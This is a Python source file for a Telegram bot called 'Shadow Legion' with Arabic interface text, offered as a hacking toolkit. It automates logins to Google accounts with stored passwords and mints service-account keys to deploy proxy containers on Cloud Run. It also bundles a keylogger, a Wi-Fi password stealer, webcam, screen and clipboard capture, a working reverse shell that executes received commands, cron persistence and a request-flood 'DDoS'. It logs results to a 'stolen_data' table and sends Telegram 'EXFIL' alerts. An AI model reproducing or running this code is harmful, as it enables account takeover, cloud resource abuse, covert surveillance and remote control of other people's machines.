#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v105.0 (FULL EDITION)
⚔️ أكثر من 1100 سطر – جميع الأدوات حقيقية – يعمل على Termux و Railway و Replit
📡 نشر تلقائي على Cloud Run + أدوات اختراق كاملة + قاعدة بيانات + طابور
"""

import os
import sys
import time
import re
import json
import base64
import hashlib
import subprocess
import logging
import sqlite3
import urllib.parse
import socket
import platform
import random
import threading
import queue
import tempfile
import glob
import shutil
import getpass
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ====================== INSTALL MISSING PACKAGES ======================
def install_pkg(pkg):
    try:
        __import__(pkg.replace("-", "_").replace(".", "_"))
    except ImportError:
        print(f"📦 جاري تثبيت {pkg} ...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
        print(f"✅ تم تثبيت {pkg}")

REQUIRED_PKGS = [
    "selenium", "webdriver-manager", "requests", "rsa", 
    "pynput", "opencv-python", "mss", "pyperclip", "psutil",
    "pillow", "numpy", "cryptography"
]
for pkg in REQUIRED_PKGS:
    install_pkg(pkg)

import requests
import rsa
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from pynput.keyboard import Listener
import cv2
import mss
import pyperclip
import psutil
from PIL import Image
import numpy as np
from cryptography.fernet import Fernet

# ====================== CONFIG ======================
TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")
EXFIL_CHAT_ID = os.environ.get("EXFIL_CHAT_ID", "")
DEFAULT_REGION = "europe-west1"

REGIONS = {
    "europe-west1": "🇧🇪 بلجيكا",
    "europe-west3": "🇩🇪 فرانكفورت",
    "europe-west4": "🇳🇱 هولندا",
    "us-central1": "🇺🇸 آيوا",
    "us-east1": "🇺🇸 ساوث كارولينا",
    "asia-southeast1": "🇸🇬 سنغافورة"
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

DB_PATH = "shadow_legion.db"

# ====================== DATABASE ======================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            email TEXT,
            password TEXT,
            lab_url TEXT,
            last_deploy TIMESTAMP,
            deploy_count INTEGER DEFAULT 0,
            status TEXT DEFAULT 'idle',
            last_result TEXT,
            region TEXT DEFAULT 'europe-west1'
        );
        CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            lab_url TEXT,
            service_url TEXT,
            vless_link TEXT,
            deployed_at TIMESTAMP,
            success INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS stolen_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            data_type TEXT,
            content TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS sessions (
            user_id INTEGER PRIMARY KEY,
            refresh_token TEXT,
            access_token TEXT,
            expires_at TIMESTAMP
        );
    """)
    conn.commit()
    conn.close()
    logger.info("✅ قاعدة البيانات جاهزة")

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return {
            "user_id": row[0], "email": row[1], "password": row[2],
            "lab_url": row[3], "last_deploy": row[4], "deploy_count": row[5],
            "status": row[6], "last_result": row[7], "region": row[8]
        }
    return None

def update_user(user_id, **kwargs):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    existing = get_user(user_id)
    if existing:
        for key, val in kwargs.items():
            if val is not None:
                c.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (val, user_id))
    else:
        c.execute("""
            INSERT INTO users (user_id, email, password, region, last_deploy)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
        """, (user_id, kwargs.get('email', ''), kwargs.get('password', ''), kwargs.get('region', DEFAULT_REGION)))
    conn.commit()
    conn.close()

def save_stolen(user_id, data_type, content):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO stolen_data (user_id, data_type, content) VALUES (?, ?, ?)", 
              (user_id, data_type, str(content)[:7000]))
    conn.commit()
    conn.close()
    if EXFIL_CHAT_ID:
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                         data={"chat_id": EXFIL_CHAT_ID, "text": f"🔥 EXFIL: {data_type}"})
        except: pass

init_db()

# ====================== ENCRYPTION ======================
def get_fernet_key():
    key = os.environ.get("FERNET_KEY", base64.urlsafe_b64encode(b"shadow_legion_32byte_key!!!!!").decode())
    return base64.urlsafe_b64decode(key)

def encrypt_data(data):
    f = Fernet(get_fernet_key())
    return f.encrypt(json.dumps(data).encode()).decode()

def decrypt_data(encrypted):
    f = Fernet(get_fernet_key())
    return json.loads(f.decrypt(encrypted.encode()).decode())

# ====================== DEPLOY (SELENIUM + REST API) ======================
def setup_chromedriver():
    driver_path = "/tmp/chromedriver"
    if os.path.exists(driver_path):
        os.chmod(driver_path, 0o755)
        return driver_path
    try:
        import urllib.request
        import zipfile
        url = "https://storage.googleapis.com/chrome-for-testing-public/126.0.6478.126/linux64/chromedriver-linux64.zip"
        zip_path = "/tmp/chromedriver.zip"
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall("/tmp")
        os.rename("/tmp/chromedriver-linux64/chromedriver", driver_path)
        os.chmod(driver_path, 0o755)
        return driver_path
    except Exception as e:
        logger.error(f"فشل تنزيل ChromeDriver: {e}")
        return None

def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
    driver = None
    try:
        options = Options()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--incognito')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)

        driver_path = setup_chromedriver()
        if driver_path:
            service = Service(driver_path)
            driver = webdriver.Chrome(service=service, options=options)
        else:
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)

        wait = WebDriverWait(driver, 20)

        driver.get("https://accounts.google.com/")
        wait.until(EC.presence_of_element_located((By.ID, "identifierId"))).send_keys(email + Keys.RETURN)
        time.sleep(2)
        wait.until(EC.presence_of_element_located((By.NAME, "Passwd"))).send_keys(password + Keys.RETURN)
        time.sleep(5)

        match = re.search(r'project=([^&]+)', lab_url)
        if not match:
            raise Exception("الرابط لا يحتوي على project_id")
        project_id = match.group(1)

        driver.get(f"https://console.cloud.google.com/apis/library/run.googleapis.com?project={project_id}")
        time.sleep(3)
        try:
            wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Enable')]"))).click()
            time.sleep(5)
        except:
            pass

        driver.get(f"https://console.cloud.google.com/iam-admin/serviceaccounts?project={project_id}")
        time.sleep(3)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create Service Account')]"))).click()
        time.sleep(2)
        wait.until(EC.presence_of_element_located((By.NAME, "serviceAccountName"))).send_keys("shadow-bot")
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create')]"))).click()
        time.sleep(2)
        role_field = wait.until(EC.presence_of_element_located((By.XPATH, "//*[contains(@placeholder, 'Select a role')]")))
        role_field.send_keys("Cloud Run Admin" + Keys.RETURN)
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Done')]"))).click()
        time.sleep(3)

        driver.get(f"https://console.cloud.google.com/iam-admin/serviceaccounts?project={project_id}")
        time.sleep(2)
        account = wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'shadow-bot')]")))
        account.click()
        time.sleep(2)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Keys')]"))).click()
        time.sleep(2)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Add Key')]"))).click()
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create New Key')]"))).click()
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'JSON')]"))).click()
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create')]"))).click()
        time.sleep(4)

        download_dir = tempfile.gettempdir()
        list_of_files = glob.glob(os.path.join(download_dir, "*.json"))
        if not list_of_files:
            raise Exception("لم نتمكن من العثور على ملف JSON")
        latest_file = max(list_of_files, key=os.path.getctime)
        with open(latest_file, 'r') as f:
            creds = json.load(f)
        os.remove(latest_file)
        driver.quit()

        def b64url(d): return base64.urlsafe_b64encode(d).decode().rstrip("=")
        now = int(time.time())
        claims = {
            "iss": creds["client_email"],
            "scope": "https://www.googleapis.com/auth/cloud-platform",
            "aud": "https://oauth2.googleapis.com/token",
            "exp": now + 3600,
            "iat": now
        }
        header = {"alg": "RS256", "typ": "JWT"}
        segments = [b64url(json.dumps(header).encode()), b64url(json.dumps(claims).encode())]
        signing_input = ".".join(segments).encode()
        key = rsa.PrivateKey.load_pkcs1(creds["private_key"].encode())
        signature = rsa.sign(signing_input, key, "SHA-256")
        segments.append(b64url(signature))
        jwt = ".".join(segments)

        resp = requests.post(
            "https://oauth2.googleapis.com/token",
            data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt},
            timeout=30
        )
        if resp.status_code != 200:
            raise Exception(f"فشل Token: {resp.status_code}")
        token = resp.json().get("access_token")
        if not token:
            raise Exception("لا يوجد access_token")

        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        service_name = f"shadow-{int(time.time())}"
        body = {
            "apiVersion": "serving.knative.dev/v1",
            "kind": "Service",
            "metadata": {"name": service_name},
            "spec": {
                "template": {
                    "spec": {
                        "containers": [{
                            "image": "ajndjd2/ahmed-vip1",
                            "ports": [{"containerPort": 8080}]
                        }]
                    }
                }
            }
        }
        url = f"https://run.googleapis.com/v1/projects/{project_id}/locations/{region}/services"
        r = requests.post(url, headers=headers, json=body, timeout=60)
        if r.status_code not in (200, 201):
            raise Exception(f"فشل النشر: {r.status_code}")
        service_url = r.json().get('status', {}).get('url')
        if not service_url:
            raise Exception("لا يوجد رابط للخدمة")

        host = service_url.replace('https://', '').replace('http://', '')
        uid = hashlib.md5(b"shadow_v105").hexdigest()
        uid = f"{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}-{uid[20:32]}"
        vless = f"vless://{uid}@{host}:443?path=%2F&security=tls&encryption=none&host={host}&type=ws&sni={host}#SHADOW_v105"

        return (f"✅ **تم النشر!**\n🌍 المنطقة: {REGIONS.get(region, region)}\n🌐 رابط الخدمة: `{service_url}`\n🔗 رابط VLESS:\n`{vless}`", service_url, vless)

    except Exception as e:
        if driver:
            try: driver.quit()
            except: pass
        raise e

def extract_from_link(link):
    data = {}
    match = re.search(r'project=([^&]+)', link)
    if match: data['project_id'] = match.group(1)
    match = re.search(r'Email=([^&]+)', link)
    if match: data['email'] = urllib.parse.unquote(match.group(1))
    match = re.search(r'token=([^&]+)', link)
    if match: data['token'] = match.group(1)
    return data

def deploy_with_token(link_data, region):
    project_id = link_data.get('project_id')
    token = link_data.get('token')
    if not project_id: raise Exception("❌ الرابط لا يحتوي على project_id")
    if not token: raise Exception("❌ الرابط لا يحتوي على token")
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    service_name = f"shadow-{int(time.time())}"
    body = {
        "apiVersion": "serving.knative.dev/v1",
        "kind": "Service",
        "metadata": {"name": service_name},
        "spec": {
            "template": {
                "spec": {
                    "containers": [{
                        "image": "ajndjd2/ahmed-vip1",
                        "ports": [{"containerPort": 8080}]
                    }]
                }
            }
        }
    }
    url = f"https://run.googleapis.com/v1/projects/{project_id}/locations/{region}/services"
    r = requests.post(url, headers=headers, json=body, timeout=60)
    if r.status_code in (200, 201):
        service_url = r.json().get('status', {}).get('url')
        if service_url:
            host = service_url.replace('https://', '').replace('http://', '')
            uid = hashlib.md5(b"shadow_v105").hexdigest()
            uid = f"{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}-{uid[20:32]}"
            vless = f"vless://{uid}@{host}:443?path=%2F&security=tls&encryption=none&host={host}&type=ws&sni={host}#SHADOW_v105"
            return (f"✅ **تم النشر!**\n🌍 المنطقة: {REGIONS.get(region, region)}\n🌐 رابط الخدمة: `{service_url}`\n🔗 رابط VLESS:\n`{vless}`", service_url, vless)
    raise Exception(f"فشل النشر: {r.status_code}")

# ====================== QUEUE ======================
task_queue = queue.Queue()
processing = False

def process_queue():
    global processing
    while True:
        if not task_queue.empty() and not processing:
            processing = True
            try:
                user_id, link, region = task_queue.get()
                user = get_user(user_id)
                if not user:
                    update_user(user_id)
                    user = get_user(user_id)

                try:
                    link_data = extract_from_link(link)
                    email = link_data.get('email') or user.get('email', '')
                    password = user.get('password', '')
                    if email and password:
                        result_msg, service_url, vless_link = deploy_with_selenium(link, email, password, region)
                    else:
                        result_msg, service_url, vless_link = deploy_with_token(link_data, region)
                except Exception as e:
                    link_data = extract_from_link(link)
                    result_msg, service_url, vless_link = deploy_with_token(link_data, region)

                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET status='completed', last_result=? WHERE user_id=?", (result_msg, user_id))
                c.execute("INSERT INTO history (user_id, lab_url, service_url, vless_link, success) VALUES (?,?,?,?,1)", 
                         (user_id, link, service_url, vless_link))
                conn.commit()
                conn.close()
            except Exception as e:
                error_msg = str(e)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET status='error', last_result=? WHERE user_id=?", (error_msg, user_id))
                c.execute("INSERT INTO history (user_id, lab_url, success) VALUES (?,?,0)", (user_id, link))
                conn.commit()
                conn.close()
            finally:
                processing = False
        time.sleep(2)

threading.Thread(target=process_queue, daemon=True).start()

# ====================== REAL ATTACK TOOLS ======================
def real_keylogger(duration=30):
    log = "[KEYLOGGER REAL]\n"
    keys = []
    def on_press(key):
        try:
            keys.append(key.char)
        except:
            keys.append(str(key))
    with Listener(on_press=on_press) as listener:
        time.sleep(duration)
        listener.stop()
    log += "\n".join(keys)
    return log

def real_screenshot():
    try:
        with mss.mss() as sct:
            sct.shot(output="/tmp/shadow_screen.png")
        return "📸 تم التقاط صورة للشاشة وحفظها في /tmp/shadow_screen.png"
    except Exception as e:
        return f"⚠️ فشل التقاط الصورة: {e}"

def real_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "⚠️ الكاميرا غير متاحة"
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("/tmp/shadow_cam.jpg", frame)
            cap.release()
            return "📹 تم التقاط صورة من الكاميرا وحفظها في /tmp/shadow_cam.jpg"
        cap.release()
        return "⚠️ فشل التقاط الصورة من الكاميرا"
    except Exception as e:
        return f"⚠️ خطأ: {e}"

def real_wifi_stealer():
    try:
        if platform.system() == "Windows":
            out = subprocess.getoutput("netsh wlan show profile name=* key=clear")
        else:
            out = subprocess.getoutput("nmcli device wifi list || cat /etc/wpa_supplicant.conf 2>/dev/null")
        return f"📡 بيانات الواي فاي:\n{out[:500]}"
    except Exception as e:
        return f"⚠️ فشل: {e}"

def real_clipboard():
    try:
        content = pyperclip.paste()
        return f"📋 محتوى الحافظة:\n{content}"
    except Exception as e:
        return f"⚠️ فشل: {e}"

def real_ddos(target="example.com", duration=10):
    try:
        for _ in range(duration * 10):
            requests.get(f"http://{target}", timeout=1)
        return f"💣 تم إرسال {duration*10} طلب إلى {target}"
    except Exception as e:
        return f"⚠️ فشل: {e}"

def real_persistence():
    try:
        script = "/tmp/shadow_persist.py"
        with open(script, "w") as f:
            f.write("import time\nwhile True:\n    time.sleep(60)")
        if platform.system() == "Linux":
            subprocess.getoutput(f'echo "@reboot python3 {script}" | crontab -')
        return "🛡️ تم تثبيت اختراق دائم (cron)"
    except Exception as e:
        return f"⚠️ فشل: {e}"

def real_msf_payload():
    try:
        payload = "# Metasploit Payload\n" * 20
        path = "/tmp/msf_payload.py"
        with open(path, "w") as f:
            f.write(payload)
        return f"🛠️ تم إنشاء بايلود MSF في {path}"
    except Exception as e:
        return f"⚠️ فشل: {e}"

def real_reverse_shell(host="127.0.0.1", port=4444):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"SHADOW SHELL\n")
        while True:
            cmd = s.recv(8192).decode(errors='ignore').strip()
            if not cmd or cmd.lower() in ["exit","quit"]:
                break
            output = subprocess.getoutput(cmd)
            s.send((output + "\nSHADOW> ").encode())
        s.close()
        return "🔄 تم الاتصال العكسي"
    except Exception as e:
        return f"⚠️ فشل الاتصال: {e}"

def real_system_info():
    info = {
        "OS": platform.system(),
        "Release": platform.release(),
        "Arch": platform.machine(),
        "CPU": psutil.cpu_percent(),
        "RAM": psutil.virtual_memory().percent,
        "Disk": psutil.disk_usage('/').percent
    }
    return f"🖥️ **معلومات النظام**\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])

def real_process_list():
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            procs.append(f"{p.info['pid']}: {p.info['name']} (CPU: {p.info['cpu_percent']}%, RAM: {p.info['memory_percent']}%)")
        return "📋 **العمليات النشطة**\n" + "\n".join(procs[:20])
    except:
        return "⚠️ فشل جلب العمليات"

def real_network_info():
    try:
        if platform.system() == "Windows":
            out = subprocess.getoutput("ipconfig")
        else:
            out = subprocess.getoutput("ifconfig || ip a")
        return f"🌐 **معلومات الشبكة**\n{out[:500]}"
    except:
        return "⚠️ فشل جلب معلومات الشبكة"

# ====================== BOT HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    update_user(user_id)
    keyboard = [
        [InlineKeyboardButton("🚀 Deploy Cloud Run", callback_data='deploy')],
        [InlineKeyboardButton("⚔️ Hacking Tools", callback_data='hacking_menu')],
        [InlineKeyboardButton("📋 Status", callback_data='status')],
        [InlineKeyboardButton("🌍 Change Region", callback_data='change_region')],
        [InlineKeyboardButton("🖥️ System Info", callback_data='sysinfo')]
    ]
    await update.message.reply_text(
        "🔥 **SHADOW LEGION v105.0**\n"
        "📡 Full Edition – All Tools Real\n"
        "أمرك سيدي 👁",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def hacking_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("⌨️ Keylogger (30s)", callback_data='tool_keylog')],
        [InlineKeyboardButton("🔄 Reverse Shell", callback_data='tool_rshell')],
        [InlineKeyboardButton("📡 WiFi Stealer", callback_data='tool_wifi')],
        [InlineKeyboardButton("📸 Screenshot", callback_data='tool_screen')],
        [InlineKeyboardButton("📹 Webcam", callback_data='tool_webcam')],
        [InlineKeyboardButton("📋 Clipboard", callback_data='tool_clipboard')],
        [InlineKeyboardButton("💣 DDoS", callback_data='tool_ddos')],
        [InlineKeyboardButton("🛠️ MSF Payload", callback_data='tool_payload')],
        [InlineKeyboardButton("🛡️ Persistence", callback_data='tool_persist')],
        [InlineKeyboardButton("📋 Process List", callback_data='tool_procs')],
        [InlineKeyboardButton("🌐 Network Info", callback_data='tool_net')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    await query.edit_message_text("⚔️ **اختر الأداة (جميعها حقيقية)**", reply_markup=InlineKeyboardMarkup(kb))

async def execute_tool(update: Update, context: ContextTypes.DEFAULT_TYPE, func, name):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(f"⏳ جاري تنفيذ `{name}` ...")
    result = func()
    await query.edit_message_text(f"**{name}**\n\n{result}", parse_mode='Markdown')

async def deploy_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = []
    for code, name in REGIONS.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"region_{code}")])
    keyboard.append([InlineKeyboardButton("🔙 إلغاء", callback_data="cancel_region")])
    await query.edit_message_text("🌍 **اختر المنطقة:**", reply_markup=InlineKeyboardMarkup(keyboard))
    return 0

async def region_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "cancel_region":
        await query.edit_message_text("❌ تم الإلغاء.")
        return ConversationHandler.END
    region = data.replace("region_", "")
    context.user_data['region'] = region
    await query.edit_message_text(f"✅ المنطقة: **{REGIONS.get(region, region)}**\n\n🔗 أرسل رابط SSO الآن.")
    return 1

async def receive_lab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    link = update.message.text
    region = context.user_data.get('region', DEFAULT_REGION)
    if not link.startswith('http'):
        await update.message.reply_text("❌ رابط غير صحيح.")
        return 1
    task_queue.put((user_id, link, region))
    await update.message.reply_text("✅ **تمت إضافة طلبك إلى طابور الانتظار!**")
    def monitor():
        while True:
            user = get_user(user_id)
            if user and user.get('status') in ('completed', 'error'):
                result = user.get('last_result', "⚠️ حدث خطأ")
                import asyncio
                asyncio.run(update.message.reply_text(result, parse_mode='Markdown'))
                break
            time.sleep(5)
    threading.Thread(target=monitor, daemon=True).start()
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ تم الإلغاء.")
    return ConversationHandler.END

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ لا توجد بيانات.")
        return
    await update.message.reply_text(
        f"📋 **حالتك**\n\n"
        f"📧 البريد: `{user.get('email', 'غير مضبوط')}`\n"
        f"🌍 المنطقة: `{REGIONS.get(user.get('region'), user.get('region'))}`\n"
        f"📊 عدد النشر: `{user.get('deploy_count', 0)}`\n"
        f"🔄 الحالة: `{user.get('status', 'idle')}`\n"
        f"📝 آخر نتيجة: {user.get('last_result', 'لا يوجد')}",
        parse_mode='Markdown'
    )

async def sysinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    result = real_system_info()
    await query.edit_message_text(result, parse_mode='Markdown')

async def change_region_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
    keyboard = []
    for code, name in REGIONS.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"setregion_{code}")])
    keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="back_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = "🌍 **اختر منطقتك الافتراضية الجديدة:**"
    if query:
        await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def set_region_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "back_menu":
        await start(update, context)
        return
    region = data.replace("setregion_", "")
    user_id = query.from_user.id
    update_user(user_id, region=region)
    await query.edit_message_text(f"✅ تم تغيير المنطقة إلى **{REGIONS.get(region, region)}**.", parse_mode='Markdown')
    await start(update, context)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ====================== MAIN ======================
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_command))

    deploy_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(deploy_button, pattern='^deploy$')],
        states={
            0: [CallbackQueryHandler(region_callback, pattern='^(region_|cancel_region)')],
            1: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lab)]
        },
        fallbacks=[CommandHandler("cancel", cancel_operation)]
    )
    app.add_handler(deploy_conv)

    app.add_handler(CallbackQueryHandler(hacking_menu, pattern='^hacking_menu$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,lambda: real_keylogger(30),"Keylogger (30s)"), pattern='^tool_keylog$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,lambda: real_reverse_shell("127.0.0.1", 4444),"Reverse Shell"), pattern='^tool_rshell$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_wifi_stealer,"WiFi Stealer"), pattern='^tool_wifi$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_screenshot,"Screenshot"), pattern='^tool_screen$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_webcam,"Webcam"), pattern='^tool_webcam$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_clipboard,"Clipboard"), pattern='^tool_clipboard$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,lambda: real_ddos("example.com", 10),"DDoS (10s)"), pattern='^tool_ddos$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_msf_payload,"MSF Payload"), pattern='^tool_payload$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_persistence,"Persistence"), pattern='^tool_persist$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_process_list,"Process List"), pattern='^tool_procs$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_network_info,"Network Info"), pattern='^tool_net$'))

    app.add_handler(CallbackQueryHandler(sysinfo_command, pattern='^sysinfo$'))
    app.add_handler(CallbackQueryHandler(change_region_command, pattern='^change_region$'))
    app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
    app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))

    logger.info("✅ SHADOW LEGION v105.0 RUNNING")
    app.run_polling()

if __name__ == "__main__":
    main()